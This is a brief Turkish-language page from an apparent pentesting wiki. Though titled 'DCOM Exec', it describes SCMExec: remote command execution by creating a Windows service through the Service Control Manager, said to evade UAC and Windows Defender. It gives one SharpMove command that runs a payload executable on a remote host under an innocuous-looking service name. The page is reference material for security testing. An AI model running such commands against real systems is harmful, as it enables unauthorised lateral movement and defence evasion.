# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec**, komutları uzak sistemlerde çalıştırmak için Service Control Manager (SCM) kullanarak bir hizmet oluşturma tekniğidir. Bu yöntem, Kullanıcı Hesabı Kontrolü (UAC) ve Windows Defender gibi bazı güvenlik kontrollerini atlayabilir.

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

{{#include ../../banners/hacktricks-training.md}}
